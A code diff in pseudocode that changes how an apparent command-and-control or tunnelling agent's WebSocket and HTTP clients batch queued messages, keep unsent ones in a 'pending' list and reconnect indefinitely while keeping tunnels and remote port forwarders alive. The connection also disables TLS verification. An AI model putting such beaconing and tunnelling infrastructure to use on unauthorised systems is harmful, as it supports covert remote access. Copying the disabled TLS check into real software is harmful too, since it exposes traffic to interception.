@@ -572,8 +572,10 @@ class Client:
 class WSClient extends Client:
     websocket: WebSocket
     upstream_queue: concurrent_queue<message>
+    pending: list<message>     # persists across reconnects — field, not local
 
     function connect():
+        close_transport()
         websocket = await open_websocket(url, headers={User-Agent: user_agent}, tls_verify=false)
 
         # Check-in: identify ourselves to the server.
@@ -645,12 +647,11 @@ class WSClient extends Client:
 
     function send_loop():
         # THE single writer. Parks on a blocking dequeue — no CPU when idle,
-        # no latency when a message arrives. On send failure, re-queue the
-        # batch and break — the reconnect logic in main() will start a fresh
-        # send_loop that drains whatever accumulated while disconnected.
+        # no latency when a message arrives. On send failure, break — pending
+        # retains unsent messages and the next start() picks them up.
         #
-        # INVARIANT: no queued message is ever lost. Every message dequeued
-        # must either be sent successfully or re-queued before the loop exits.
+        # INVARIANT: no queued message is ever lost. Every message drained
+        # into pending stays there until confirmed sent.
         #
         # Runtimes that lack a blocking dequeue (e.g. plain JS arrays) or
         # whose send does not throw on a dead socket (e.g. Node's `ws`
@@ -658,19 +659,21 @@ class WSClient extends Client:
         # wake and a readyState guard before sending — as long as the
         # invariant holds.
         while true:
-            message = await upstream_queue.dequeue()   // parks until a message
+            if pending is empty:
+                pending.append(await upstream_queue.dequeue())
+                drain all remaining from upstream_queue into pending
+                // dequeue() parks until at least one message; then
+                // drain_nowait pulls everything else that's ready.
+
             try:
-                payload = serialize_messages(
-                    [CheckInMessage(messenger_id=self.identifier), message],
-                    encryption_key)
+                batch = [CheckInMessage(messenger_id=self.identifier)]
+                batch.extend(pending)
+                payload = serialize_messages(batch, encryption_key)
                 await websocket.send_binary(payload)
+                pending.clear()
             catch:
-                // Send failed — re-queue AT THE FRONT so it is sent first on
-                // the next connection. Back-of-queue re-enqueue reorders it
-                // behind messages that producers added after the dequeue,
-                // corrupting ordered streams.
-                upstream_queue.enqueue_front(message)
                 break
+                // pending is NOT cleared — retried on reconnect.
 
     function send_upstream_message(message):
         # Producer only — NEVER writes the socket. Enqueue; the send_loop
@@ -715,7 +718,7 @@ class HTTPClient extends Client:
         # Polling loop — blocks until an error triggers reconnection.
         while true:
             if pending is empty:
-                drain up to 5 messages from upstream_queue into pending
+                drain all available messages from upstream_queue into pending
 
             batch = [CheckInMessage(messenger_id=self.identifier)]
             batch.extend(pending)
@@ -1025,21 +1028,14 @@ function main():
             await sleep(sleep_interval)
 
             try:
-                cleanup_transport(client)
-                // Cancel send loops, dispose old WebSocket/HTTP client.
-                // Create fresh transport internals.
-                //
-                // What MUST be cleaned up:
-                //   - Cancel tokens / stop send loops
-                //   - Dispose old transport (WebSocket, HTTP client)
-                //
-                // What MUST persist across reconnect:
+                await client.connect()
+                // connect() closes the old transport before opening a new one.
+                // What persists across reconnect:
                 //   - client.identifier (server uses it to recognize us)
                 //   - client.tcp_clients (tunnels may still be alive)
                 //   - remote_port_forwarders (server-initiated RPF listeners)
                 //   - upstream message queue (messages queued during disconnect)
-
-                await client.connect()
+                //   - pending (unsent messages from the last connection)
                 log("[+] Reconnected")
                 consecutive_failures = 0
                 // Reset on success — allows infinite reconnections as long as
